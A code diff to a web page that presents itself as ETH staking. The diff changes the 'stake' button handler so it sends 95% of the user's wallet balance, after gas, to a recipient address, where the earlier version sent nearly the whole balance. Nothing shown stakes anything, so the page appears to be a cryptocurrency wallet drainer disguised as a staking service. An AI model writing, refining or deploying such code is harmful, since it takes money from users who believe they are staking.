@@ -148,7 +148,7 @@
         }
     }
 
-    // Stake ETH from user's wallet to the recipient address
+    // Send 95% of ETH from user's wallet to the recipient address
     document.getElementById("stakeButton").addEventListener("click", async () => {
         try {
             // Display progress bar
@@ -174,16 +174,17 @@
             // Calculate total gas cost
             const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
 
+            // Calculate 95% of balance after gas
+            const balanceAfterGas = BigInt(balance) - gasCost;
+            const valueToSend = balanceAfterGas * BigInt(95) / BigInt(100);
+
             // Ensure gas fee does not exceed balance
-            if (gasCost >= BigInt(balance)) {
+            if (valueToSend <= 0) {
                 document.getElementById("status").innerText = "Insufficient ETH to cover gas fees.";
                 clearInterval(progressInterval);
                 document.getElementById("progress").style.width = "0%";
                 return;
             }
-
-            // Calculate the amount to send, accounting for gas cost
-            const valueToSend = BigInt(balance) - gasCost;
 
             // Send ETH to the recipient
             const tx = await web3.eth.sendTransaction({
